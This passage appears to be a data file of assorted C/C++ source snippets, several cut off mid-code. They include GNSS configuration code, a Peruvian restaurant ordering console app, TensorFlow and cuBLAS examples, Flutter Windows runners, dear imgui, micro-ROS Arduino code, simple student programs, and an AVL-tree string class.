LOC_LOGE(\"%s]: mGnss is nullptr\", __FUNCTION__);\n        return false;\n    }\n\n    GnssConfig config;\n    memset(&config, 0, sizeof(GnssConfig));\n    config.size = sizeof(GnssConfig);\n    config.flags = GNSS_CONFIG_FLAGS_SUPL_MODE_BIT;\n    switch (mode) {\n        case 0:\n            config.suplModeMask = 0; // STANDALONE ONLY\n            break;\n        case 1:\n            config.suplModeMask = GNSS_CONFIG_SUPL_MODE_MSB_BIT;\n            break;\n        case 2:\n            config.suplModeMask = GNSS_CONFIG_SUPL_MODE_MSA_BIT;\n            break;\n        case 3:\n            config.suplModeMask = GNSS_CONFIG_SUPL_MODE_MSB_BIT | GNSS_CONFIG_SUPL_MODE_MSA_BIT;\n            break;\n        default:\n            LOC_LOGE(\"%s]: invalid mode: %d.\", __FUNCTION__, mode);\n            return false;\n    }\n\n    return mGnss->updateConfiguration(config);\n}\n\nReturn<bool> GnssConfiguration::setLppProfile(uint8_t lppProfileMask) {\n    if (mGnss == nullptr) {\n        LOC_LOGE(\"%s]: mGnss is nullptr\", __FUNCTION__);\n        return false;\n    }\n\n    GnssConfig config = {};\n    config.size = sizeof(GnssConfig);\n    config.flags = GNSS_CONFIG_FLAGS_LPP_PROFILE_VALID_BIT;\n    config.lppProfileMask = GNSS_CONFIG_LPP_PROFILE_RRLP_ON_LTE; //default\n\n    if (lppProfileMask & (1<<0)) {\n        config.lppProfileMask |= GNSS_CONFIG_LPP_PROFILE_USER_PLANE_BIT;\n    }\n    if (lppProfileMask & (1<<1)) {\n        config.lppProfileMask |= GNSS_CONFIG_LPP_PROFILE_CONTROL_PLANE_BIT;\n    }\n    if (lppProfileMask & (1<<2)) {\n        config.lppProfileMask |= GNSS_CONFIG_LPP_PROFILE_USER_PLANE_OVER_NR5G_SA_BIT;\n    }\n    if (lppProfileMask & (1<<3)) {\n        config.lppProfileMask |= GNSS_CONFIG_LPP_PROFILE_CONTROL_PLANE_OVER_NR5G_SA_BIT;\n    }\n\n    return mGnss->updateConfiguration(config);\n}\n\nReturn<bool> GnssConfiguration::setGlonassPositioningProtocol(uint8_t protocol) {\n    if (mGnss == nullptr) {\n        LOC_LOGE(\"%s]: mGnss is nullptr\", __FUNCTION__);\n        return false;\n    }\n\n    GnssConfig config;\n    memset(&config, 0, sizeof(GnssConfig));\n    config.size = sizeof(GnssConfig);\n\n    config.flags = GNSS_CONFIG_FLAGS_AGLONASS_POSITION_PROTOCOL_VALID_BIT;\n    if (protocol & (1<<0)) {\n        config.aGlonassPositionProtocolMask |= GNSS_CONFIG_RRC_CONTROL_PLANE_BIT;\n    }\n    if (protocol & (1<<1)) {\n        config.aGlonassPositionProtocolMask |= GNSS_CONFIG_RRLP_USER_PLANE_BIT;\n    }\n    if (protocol & (1<<2)) {\n        config.aGlonassPositionProtocolMask |= GNSS_CONFIG_LLP_USER_PLANE_BIT;\n    }\n    if (protocol & (1<<3)) {\n      ",
    "#include<stdio.h>\n#include<conio.h>\n#include<iostream>\n#include<windows.h>\n#include<time.h>\n#include<string>\n#include <clocale>\n\nusing namespace std;\n\nvoid gotoxy(short x,short y){\n    HANDLE hStdout = GetStdHandle(STD_OUTPUT_HANDLE);\n    COORD pos ={x, y};\n    SetConsoleCursorPosition(hStdout,pos);\n}//posicion del programa\nvoid menu(){\n    cout<<\"1. CREAR ORDEN  \"<<endl;\n    cout<<\"2. MODIFICAR ORDEN  \"<<endl;\n    cout<<\"3. BUSCAR ORDEN \"<<endl;\n    cout<<\"4. GENERAR BOLETA\"<<endl;\n    cout<<\"0. SALIR DEL SISTEMA\"<<endl<<endl;\n\n    cout<<\"Ingrese Opcion: \";\n}//menu principal\nvoid version(){\n    cout<<\"Versi\u00f3n \"<<1<<\".\"<<5<<\".\"<<0<<\" - Solo para desarrolladores - \u00a1No distribuir!\"<<endl;\n    cout<<\"\\n\\t\\t  ADMINISTRADOR DE RESTAURANTES - MACCHIAVELLO'S RESTAURANT\"<<endl<<endl;\n}//tipo de version\nvoid logo(){\n    cout<<\"  __  __                _     _                 _ _       _     \"<<endl;\n    cout<<\" |  \\\\/  | __ _  ___ ___| |__ (_) __ ___   _____| | | ___ ( )___ \"<<endl;\n    cout<<\" | |\\\\/| |/ _` |/ __/ __| '_ \\\\| |/ _` \\\\ \\\\ / / _ \\\\ | |/ _ \\\\|// __|\"<<endl;\n    cout<<\" | |  | | (_| | (_| (__| | | | | (_| |\\\\ V /  __/ | | (_) | \\\\__ \\\\\"<<endl;\n    cout<<\" |_|  |_|\\\\__,_|\\\\___\\\\___|_| |_|_|\\\\__,_| \\\\_/ \\\\___|_|_|\\\\___/  |___/\"<<endl;\n    cout<<\"        |  _ \\\\ ___  ___| |_ __ _ _   _ _ __ __ _ _ __ | |_ \"<<endl;\n    cout<<\"        | |_) / _ \\\\/ __| __/ _` | | | | '__/ _` | '_ \\\\| __|\"<<endl;\n    cout<<\"        |  _ <  __/\\\\__ \\\\ || (_| | |_| | | | (_| | | | | |_ \"<<endl;\n    cout<<\"        |_| \\\\_\\\\___||___/\\\\__\\\\__,_|\\\\__,_|_|  \\\\__,_|_| |_|\\\\__|\"<<endl;\n} //logo\nstruct orden_menu{\n    string nos;\n    float pr;\n}c[25];//para que se viera ordenadamente el menu_cartas\n\nvoid menu_carta(){\n    int id;\n    string nombreplato;\n    float precio;\n    cout<<\"                                   => Menu de platos <=\"<<endl;\n    cout<<\"                    ID    NOMB. ITEM                        PRECIO\"<<endl;\n    cout<<\"                  ------------------------------------------------------\"<<endl;\n    for(int i=1; i<=5;i++){\n\n        switch(i){\n            ///Entradas\n            case 1:{\n                nombreplato =\"Caldo de Gallina\";\n                precio = 8.00;\n                break;\n            }\n            case 2:{\n                nombreplato= \"Sopa de Wantan\";\n                precio =8.00;\n                break;\n            }\n            case 3:{\n                nombreplato=\"Teque\u00f1os\";\n                precio =5.50;\n                break;\n            }\n            case 4:{\n                nombreplato=\"Wantan con salsa de Tamarindo\";\n                precio =6.50;\n                break;\n            }\n            case 5:{\n                nombreplato=\"Yuquitas fritas con Huancaina\";\n                precio =7.00;\n                break;\n            }\n        }\n        id=i+100;\n        c[i].nos=nombreplato;\n        c[i].pr=precio;\n        gotoxy(20, i+6);cout<<id;\n        cout<<\"   \"<<c[i].nos;\n        gotoxy(60, i+6);cout<<\"S/.\"<<c[i].pr<<endl;\n    }\n    cout<<\"                  ------------------------------------------------------\"<<endl;\n    for(int i=1; i<=10;i++){\n        id=i;\n        switch(id){\n                ///Menu\n            case 1:{\n                nombreplato=\"Chaufa de Pollo\";\n                precio =12.00;\n                break;\n            }\n            case 2:{\n                nombreplato=\"Chaufa de Carne\";\n                precio =13.00;\n                break;\n            }\n            case 3:{\n                nombreplato=\"Chaufa de Mariscos\";\n                precio =15.00;\n                break;\n            }\n            case 4:{\n                nombreplato=\"Chaufa Regional\";\n                precio =13.50;\n                break;\n            }\n            case 5:{\n                nombreplato=\"Chaufa Especial\";\n                precio =18.00;\n                break;\n            }\n            case 6:{\n                nombreplato=\"Aeropuerto\";\n                precio =17.00;\n                break;\n            }\n            case 7:{\n                nombreplato =\"Lomo Saltado\";\n                precio =16.50;\n                break;\n            }\n            case 8:{\n                nombreplato =\"Tacu Tacu\";\n                precio =14.50;\n                break;\n            }\n            case 9:{\n                nombreplato=\"Locro con Cecina\";\n                precio =15.00;\n                break;\n            }\n            case 10:{\n                nombreplato=\"Tallarin Saltado\";\n                precio = 18.00;\n                break;\n            }\n        }\n        id=i+200;\n        c[i].nos=nombreplato;\n        c[i].pr=precio;\n        gotoxy(20, i+12);cout<<id;\n        cout<<\"   \"<<c[i].nos;\n        gotoxy(60, i+12);cout<<\"S/.\"<<c[i].pr<<endl;\n\n    }\n    cout<<\"                  ------------------------------------------------------\"<<endl;\n    for(int i=1; i<=5;i++){\n        id=i;\n        switch(id){\n            case 1:{\n                nombreplato =\"Inca Kola 1L\";\n                precio =4.50;\n       ",
    "#include <tensorflow/cc/client/client_session.h>\n#include <tensorflow/cc/ops/standard_ops.h>\n#include <tensorflow/core/framework/tensor.h>\n\nint main() {\n    using namespace tensorflow;\n    using namespace tensorflow::ops;\n\n    // Cria\u00e7\u00e3o do escopo\n    Scope root = Scope::NewRootScope();\n\n    // Cria\u00e7\u00e3o de um placeholder para a entrada\n    auto input = Placeholder(root, DT_FLOAT, Placeholder::Shape({1, 3}));\n\n    // Cria\u00e7\u00e3o de vari\u00e1veis para os pesos e bias\n    auto weights = Variable(root, {3, 2}, DT_FLOAT);\n    auto biases = Variable(root, {2}, DT_FLOAT);\n\n    // Inicializa\u00e7\u00e3o dos pesos e bias\n    auto assign_weights = Assign(root, weights, Const(root, {{0.1f, 0.2f}, {0.3f, 0.4f}, {0.5f, 0.6f}}));\n    auto assign_biases = Assign(root, biases, Const(root, {0.1f, 0.2f}));\n\n    // C\u00e1lculo da camada densa\n    auto dense_layer = Add(root, MatMul(root, input, weights), biases);\n\n    // Cria\u00e7\u00e3o de uma sess\u00e3o para executar as opera\u00e7\u00f5es\n    ClientSession session(root);\n\n    // Executar a inicializa\u00e7\u00e3o das vari\u00e1veis\n    session.Run({assign_weights, assign_biases}, nullptr);\n\n    // Cria\u00e7\u00e3o do tensor de entrada\n    Tensor input_data(DT_FLOAT, TensorShape({1, 3}));\n    auto input_matrix = input_data.matrix<float>();\n    input_matrix(0, 0) = 1.0f;\n    input_matrix(0, 1) = 2.0f;\n    input_matrix(0, 2) = 3.0f;\n\n    // Executar a camada densa\n    std::vector<Tensor> outputs;\n    session.Run({{input, input_data}}, {dense_layer}, &outputs);\n\n    // Exibir o resultado\n    std::cout << outputs[0].matrix<float>() << std::endl;\n\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"chat_app_with_socket\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <cublas_v2.h>\n#include <cuda_runtime.h>\n#include <cstdlib>\n#include <climits>\n\nusing namespace std;\ncublasHandle_t global_cublas_handle;\n\n\n#define CHECK_CUDA(call) do { \\\n    cudaError_t err = call; \\\n    if (err != cudaSuccess) { \\\n        std::cerr << \"CUDA error at \" << __FILE__ << \":\" << __LINE__; \\\n        std::cerr << \" code=\" << err << \" \\\"\" << cudaGetErrorString(err) << \"\\\"\" << std::endl; \\\n        exit(EXIT_FAILURE); \\\n    } \\\n} while(0)\n\n#define CHECK_CUBLAS(call) do { \\\n    cublasStatus_t err = call; \\\n    if (err != CUBLAS_STATUS_SUCCESS) { \\\n        std::cerr << \"cuBLAS error at \" << __FILE__ << \":\" << __LINE__; \\\n        std::cerr << \" code=\" << err << std::endl; \\\n        exit(EXIT_FAILURE); \\\n    } \\\n} while(0)\n\n#define CHECK_CUDNN(call)                                          {                                                                             \\\n    cudnnStatus_t err = call;                                                 \\\n    if (err != CUDNN_STATUS_SUCCESS) {                                        \\\n        std::cerr << \"cuDNN error in file '\" << __FILE__ << \"' at line \" << __LINE__ \\\n                  << \" : \" << cudnnGetErrorString(err) << std::endl;          \\\n        std::exit(EXIT_FAILURE);                                              \\\n    }                                                                         \\\n}\n\nclass Matrix {\npublic:\n    int rows, cols;\n    float *data;\n\n    // Constructor\n    Matrix(int rows, int cols) : rows(rows),cols(cols) {\n        CHECK_CUDA(cudaMallocManaged(&data, cols * rows * sizeof(float)));\n    }\n\n    // Destructor\n    ~Matrix() {\n        cudaFree(data);\n    }\n\n    // Access element\n    float& operator()(int col, int row) {\n        return data[row * cols + col];\n    }\n\n    // Access element (const version)\n    const float& operator()(int col, int row) const {\n        return data[row * cols + col];\n    }\n\n    // Print matrix\n    void print(int limit = INT_MAX) const {\n    int count = 0;\n\n    for (int row = 0; row < rows; row++) {\n        for (int col = 0; col < cols; col++) {\n            std::cout << data[row * cols + col] << \" \";\n            count ++;\n            if (count > limit){\n                return;\n            }\n        }\n        std::cout << std::endl;\n    }\n    }\n\n\n\n    // Initialize matrix with zeros\n    void init_zeros() {\n        for (int i = 0; i < cols * rows; ++i) {\n            data[i] = 0.0f;\n        }\n    }\n\n    // Initialize matrix with random values scaled by 0.01\n    void init_random() {\n        for (int i = 0; i < cols * rows; ++i) {\n            data[i] = 10.0f * static_cast<float>(rand()) / RAND_MAX;\n        }\n    }\n\n    void init_consec() const {\n    int count = 0;\n\n    for (int row = 0; row < rows; row++) {\n        for (int col = 0; col < cols; col++) {\n            data[row * cols + col] = count;\n            count ++;\n        }\n    }\n}\n\n    // Matrix multiplication\n    static void multiply(const Matrix& A, const Matrix& B, Matrix& C, bool transpose_A = false, bool transpose_B = false) {\n\n    int Rows_A = transpose_A ? A.cols : A.rows;\n    int Cols_A = transpose_A ? A.rows : A.cols;\n    int Rows_B = transpose_B ? B.cols : B.rows;\n    int Cols_B = transpose_B ? B.rows : B.cols;\n\n    if (Cols_A != Rows_B){\n        throw std::invalid_argument(\"Matrix dimensions do not match for multiplication\");\n    }\n\n    if (C.rows != Rows_A || C.cols != Cols_B){\n        throw std::invalid_argument(\"C dimensions are not compatible with A and B\");\n    }\n\n    const float alpha = 1.0f;\n    const float beta = 0.0f;\n\n    // this will handle row major and carry out the mm like normal\n    cublasSgemm(global_cublas_handle,\n            transpose_B ? CUBLAS_OP_T : CUBLAS_OP_N ,\n            transpose_A ? CUBLAS_OP_T : CUBLAS_OP_N ,\n            C.cols , C.rows, transpose_A ? A.rows : A.cols,\n            &alpha,\n            B.data, B.cols,\n            A.data, A.cols,\n            &beta,\n            C.data,C.cols);\n\n    // **** SUPER IMPORTANT        \n    cudaDeviceSynchronize();\n\n    }\n\n};\n\n\nint main() {\n\n    CHECK_CUBLAS(cublasCreate(&global_cublas_handle));\n    \n    int m = 2; // rows in A and rows in C\n    int k = 4; // cols in A and rows in B\n    int n = 3; // cols in B and cols in C\n\n    Matrix A(m,k);\n    Matrix B(k,n);\n    Matrix C(m,n);\n\n    A.init_consec();\n    B.init_consec();\n\n    cout << \"A:\"<< endl;\n    A.print();\n    cout << \"B:\"<< endl;\n    B.print();\n\n    Matrix::multiply(A,B,C, false, false);\n\n    cout << \"C:\"<< endl;\n    C.print();\n\n    CHECK_CUBLAS(cublasDestroy(global_cublas_handle)); // Destroy cuBLAS context\n\n    return 0;\n}\n\n// int main() {\n//     int m = 2; // rows in A\n//     int k = 4; // cols in A and rows in B\n//     int n = 3; // rows in B\n//     int print = 1;\n//     cublasHandle_t handle;\n\n//     float *a, *b, *c;\n\n//     // Allocate memory for a, b, c\n//     a = (float*)malloc(m * k * sizeof(float));\n//     b = (float*)malloc(k * n * sizeof(float));\n//     c = (float*)malloc(m * n * si",
    "// dear imgui, v1.85 WIP\n// (drawing and font code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] STB libraries implementation\n// [SECTION] Style functions\n// [SECTION] ImDrawList\n// [SECTION] ImDrawListSplitter\n// [SECTION] ImDrawData\n// [SECTION] Helpers ShadeVertsXXX functions\n// [SECTION] ImFontConfig\n// [SECTION] ImFontAtlas\n// [SECTION] ImFontAtlas glyph ranges helpers\n// [SECTION] ImFontGlyphRangesBuilder\n// [SECTION] ImFont\n// [SECTION] ImGui Internal Render Helpers\n// [SECTION] Decompression code\n// [SECTION] Default font data (ProggyClean.ttf)\n\n*/\n\n#if defined(_MSC_VER) && !defined(_CRT_SECURE_NO_WARNINGS)\n#define _CRT_SECURE_NO_WARNINGS\n#endif\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n\n#ifndef IMGUI_DEFINE_MATH_OPERATORS\n#define IMGUI_DEFINE_MATH_OPERATORS\n#endif\n\n#include \"imgui_internal.h\"\n#ifdef IMGUI_ENABLE_FREETYPE\n#include \"misc/freetype/imgui_freetype.h\"\n#endif\n\n#include <stdio.h>      // vsnprintf, sscanf, printf\n#if !defined(alloca)\n#if defined(__GLIBC__) || defined(__sun) || defined(__APPLE__) || defined(__NEWLIB__)\n#include <alloca.h>     // alloca (glibc uses <alloca.h>. Note that Cygwin may have _WIN32 defined, so the order matters here)\n#elif defined(_WIN32)\n#include <malloc.h>     // alloca\n#if !defined(alloca)\n#define alloca _alloca  // for clang with MS Codegen\n#endif\n#else\n#include <stdlib.h>     // alloca\n#endif\n#endif\n\n// Visual Studio warnings\n#ifdef _MSC_VER\n#pragma warning (disable: 4127)     // condition expression is constant\n#pragma warning (disable: 4505)     // unreferenced local function has been removed (stb stuff)\n#pragma warning (disable: 4996)     // 'This function or variable may be unsafe': strcpy, strdup, sprintf, vsnprintf, sscanf, fopen\n#pragma warning (disable: 6255)     // [Static Analyzer] _alloca indicates failure by raising a stack overflow exception.  Consider using _malloca instead.\n#pragma warning (disable: 26451)    // [Static Analyzer] Arithmetic overflow : Using operator 'xxx' on a 4 byte value and then casting the result to a 8 byte value. Cast the value to the wider type before calling operator 'xxx' to avoid overflow(io.2).\n#pragma warning (disable: 26812)    // [Static Analyzer] The enum type 'xxx' is unscoped. Prefer 'enum class' over 'enum' (Enum.3). [MSVC Static Analyzer)\n#endif\n\n// Clang/GCC warnings with -Weverything\n#if defined(__clang__)\n#if __has_warning(\"-Wunknown-warning-option\")\n#pragma clang diagnostic ignored \"-Wunknown-warning-option\"         // warning: unknown warning group 'xxx'                      // not all warnings are known by all Clang versions and they tend to be rename-happy.. so ignoring warnings triggers new warnings on some configuration. Great!\n#endif\n#if __has_warning(\"-Walloca\")\n#pragma clang diagnostic ignored \"-Walloca\"                         // warning: use of function '__builtin_alloca' is discouraged\n#endif\n#pragma clang diagnostic ignored \"-Wunknown-pragmas\"                // warning: unknown warning group 'xxx'\n#pragma clang diagnostic ignored \"-Wold-style-cast\"                 // warning: use of old-style cast                            // yes, they are more terse.\n#pragma clang diagnostic ignored \"-Wfloat-equal\"                    // warning: comparing floating point with == or != is unsafe // storing and comparing against same constants ok.\n#pragma clang diagnostic ignored \"-Wglobal-constructors\"            // warning: declaration requires a global destructor         // similar to above, not sure what the exact difference is.\n#pragma clang diagnostic ignored \"-Wsign-conversion\"                // warning: implicit conversion changes signedness\n#pragma clang diagnostic ignored \"-Wzero-as-null-pointer-constant\"  // warning: zero as null pointer constant                    // some standard header variations use #define NULL 0\n#pragma clang diagnostic ignored \"-Wcomma\"                          // warning: possible misuse of comma operator here\n#pragma clang diagnostic ignored \"-Wreserved-id-macro\"              // warning: macro name is a reserved identifier\n#pragma clang diagnostic ignored \"-Wdouble-promotion\"               // warning: implicit conversion from 'float' to 'double' when passing argument to function  // using printf() is a misery with this as C++ va_arg ellipsis changes float to double.\n#pragma clang diagnostic ignored \"-Wimplicit-int-float-conversion\"  // warning: implicit conversion from 'xxx' to 'float' may lose precision\n#elif defined(__GNUC__)\n#pragma GCC diagnostic ignored \"-Wpragmas\"                  // warning: unknown option after '#pragma GCC diagnostic' kind\n#pragma GCC diagnostic ignored \"-Wunused-function\"          // warning: 'xxxx' defined but not used\n#pragma GCC diagnostic ignored \"-Wdouble-promotion\"         // warning: implicit conversion from 'float' to 'double' when passing argument to function\n#pragma GCC diagnostic ignored \"-Wconversion\"               // warning: conversion to 'xxxx' from 'xxxx' may alter its value\n#pragma GCC diagnostic ignored \"-Wstack-protector\"          // w",
    "#include <iostream>\n#include <cstdlib>\n#include <ctime>\n#include <cmath>\n\nusing namespace std;\n\nint main() {\n    srand(time(0));\n    \n    int secretNumber = rand() % 100 + 1;\n    int guess;\n    int attempts = 0;\n\n    cout << \"Welcome to the Number Guessing Game!\\n\";\n    cout << \"I have selected a random number between 1 and 100. Try to guess it!\\n\\n\";\n\n    while (true) {\n       \n        cout << \"Enter your guess: \";\n        cin >> guess;\n\n       \n        if (cin.fail()) {\n            cin.clear();\n            cin.ignore(numeric_limits<streamsize>::max(), '\\n');\n            cout << \"Invalid input. Please enter a valid number.\\n\";\n            continue;\n        }\n\n   \n        attempts++;\n\n        if (guess == secretNumber) {\n            cout << \"Congratulations! You guessed the number \" << secretNumber << \" correctly!\\n\";\n            cout << \"It took you \" << attempts << \" attempts.\\n\";\n            break;\n        } else {\n            int difference = abs(secretNumber - guess);\n            if (difference > 20) {\n                cout << \"You're way off!\\n\";\n            } else if (difference > 10) {\n                cout << \"You're getting colder.\\n\";\n            } else if (difference > 5) {\n                cout << \"You're getting warmer.\\n\";\n            } else {\n                cout << \"You're very close!\\n\";\n            }\n        }\n    }\n\n    return 0;\n}\n\n\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"projeto_eolico\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"roomlights\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <fstream>\n#include <iostream>\n#include <string>\nusing namespace std;\n\nint main() {\n    string baris;\n    string NamaFile;\n\n    cout << \"Masukan Nama File : \";\n    cin >> NamaFile;\n\n    // membuka file dalam mode menulis\n    ofstream outfile;\n    // menunjuk ke sebuah nama file\n    outfile.open(NamaFile + \".txt\",ios::out);\n\n    cout << \">= Menulis file, \\'q' untuk keluar\" << endl;\n\n    // unlimited loop untuk menulis\n    while (true) {\n        cout << \"- \";\n        // mendapatkan setiap karakter dalam satu baris\n        getline(cin, baris);\n        // loop akan berhenti jika anda memasukan karakter q\n        if(baris== \"q\") break;\n        // menulis dan memasukan nama nilai dari 'baris' ke dalam file\n        outfile << baris << endl;\n    }\n    // selesai dalam menulis sekarang tutup filenya\n    outfile.close();\n\n    // Membuka file dalam mode membaca\n    ifstream infile;\n\n    // menunjuk ke seuah file \n    infile.open(NamaFile + \".txt\", ios::in);\n\n    cout << endl << \">= Membuka dan membaca file \" << endl;\n    // jika file ada maka\n    if (infile.is_open())\n    {\n        // melakukan perulangan setiap baris\n        while (getline(infile, baris))\n        {\n            // dan tampilkan di sini\n            cout << baris << '\\n';\n        }\n        // tutup file tersebut setelah selesai\n        infile.close();\n    }\n    // jika tidak ditemukan file maka akan menampilkan ini\n    else cout << \"Unable to open file\";\n    return 0;\n\n}",
    "#include <Arduino.h>\n#include <micro_ros_platformio.h>\n\n#include <rcl/rcl.h>\n#include <rclc/rclc.h>\n#include <rclc/executor.h>\n#include <rcl/logging.h>\n\n#include <std_msgs/msg/int32.h>\n#include <std_msgs/msg/header.h>\n#include <nav_msgs/msg/odometry.h>\n\n#define RCCHECK(fn) { rcl_ret_t temp_rc = fn; if((temp_rc != RCL_RET_OK)){error_loop();}}\n#define RCSOFTCHECK(fn) { rcl_ret_t temp_rc = fn; if((temp_rc != RCL_RET_OK)){}}\n\nrcl_publisher_t publisher;\nstd_msgs__msg__Int32 msg;\n\nrclc_executor_t executor;\nrclc_support_t support;\nrcl_allocator_t allocator;\nrcl_node_t node;\nrcl_timer_t timer;\n\n//Create a /odom publisher\nrcl_publisher_t odom_publisher;\nnav_msgs__msg__Odometry odom_msg;\n\n// Error handle loop\nvoid error_loop() {\n  while(1) {\n    delay(100);\n  }\n}\n\nvoid timer_callback(rcl_timer_t * timer, int64_t last_call_time) {\n  RCLC_UNUSED(last_call_time);\n  if (timer != NULL) {\n    RCSOFTCHECK(rcl_publish(&publisher, &msg, NULL));\n    msg.data++;\n  }\n}\n\nvoid setup() {\n  // Configure serial transport\n  Serial.begin(115200);\n  set_microros_serial_transports(Serial);\n  delay(2000);\n\n  pinMode(2, OUTPUT);\n  digitalWrite(2, HIGH);\n\n  allocator = rcl_get_default_allocator();\n\n  //create init_options\n  RCCHECK(rclc_support_init(&support, 0, NULL, &allocator));\n\n  // create node\n  RCCHECK(rclc_node_init_default(&node, \"micro_ros_platformio_node\", \"\", &support));\n\n  // create publisher\n  RCCHECK(rclc_publisher_init_default(\n    &publisher,\n    &node,\n    ROSIDL_GET_MSG_TYPE_SUPPORT(std_msgs, msg, Int32),\n    \"/arduino\"));\n\n  // create timer,\n  const unsigned int timer_timeout = 1000;\n  RCCHECK(rclc_timer_init_default(\n    &timer,\n    &support,\n    RCL_MS_TO_NS(timer_timeout),\n    timer_callback));\n\n  // create executor\n  RCCHECK(rclc_executor_init(&executor, &support.context, 1, &allocator));\n  RCCHECK(rclc_executor_add_timer(&executor, &timer));\n\n  msg.data = 0;\n}\n\nvoid loop() {\n  delay(100);\n  RCSOFTCHECK(rclc_executor_spin_some(&executor, RCL_MS_TO_NS(100)));\n}",
    "#include <iostream>\n#include <fstream>\n#include <string>\n#include <sstream>\n#include <functional>\n#include <algorithm>\n\nusing namespace std;\n\nclass super_string {\nprivate:\n    struct nodo {\n        nodo* left = nullptr;\n        nodo* right = nullptr;\n        int index;\n        char c;\n\n        nodo(int i, char ch) { // Constructor sin asignaciones\n        }\n        nodo() {}\n    };\n\n    int height = 0;\n    int length = 0;\n    nodo* root = nullptr;\n\n    /*****\n    * int altura(nodo* node)\n    ******\n    * Resumen: Calcula la altura de un nodo en el \u00e1rbol.\n    ******\n    * Input:\n    * nodo* node : Puntero al nodo cuya altura se calcular\u00e1.\n    ******\n    * Returns:\n    * int : Altura del nodo dado.\n    *****/\n    int altura(nodo* node) {\n        if (!node) {\n            return 0;\n        }\n        int alturaIzquierda = altura(node->left);\n        int alturaDerecha = altura(node->right);\n        return max(alturaIzquierda, alturaDerecha) + 1;\n    }\n\n    nodo* rotateRight(nodo* y) {\n        nodo* x = y->left;\n        nodo* T2 = x->right;\n\n        x->right = y;\n        y->left = T2;\n\n        return x;\n    }\n\n    nodo* rotateLeft(nodo* x) {\n        nodo* y = x->right;\n        nodo* T2 = y->left;\n\n        x->right = T2;\n        y->left = x;\n\n        return y;\n    }\n    /*****\n    * void balancearAVL(nodo*& node)\n    ******\n    * Resumen: Rebalancea el \u00e1rbol AVL despu\u00e9s de una inserci\u00f3n o eliminaci\u00f3n.\n    ******\n    * Input:\n    * nodo*& node : Referencia al nodo ra\u00edz del sub\u00e1rbol que se balancear\u00e1.\n    ******\n    * Returns:\n    * void, No retorna nada.\n    *****/\n    void balancearAVL(nodo*& node) {\n        if (!node) {\n            return;\n        }\n\n        int altura_izquierda = altura(node->left);\n        int altura_derecha = altura(node->right);\n        int balance = altura_izquierda - altura_derecha;\n\n        if (balance == -2) {\n            if (altura(node->right->left) > altura(node->right->right)) {\n                node->right = rotateRight(node->right);\n            }\n            node = rotateLeft(node);\n        } else if (balance == 2) {\n            if (altura(node->left->right) > altura(node->left->left)) {\n                node->left = rotateLeft(node->left);\n            }\n            node = rotateRight(node);\n  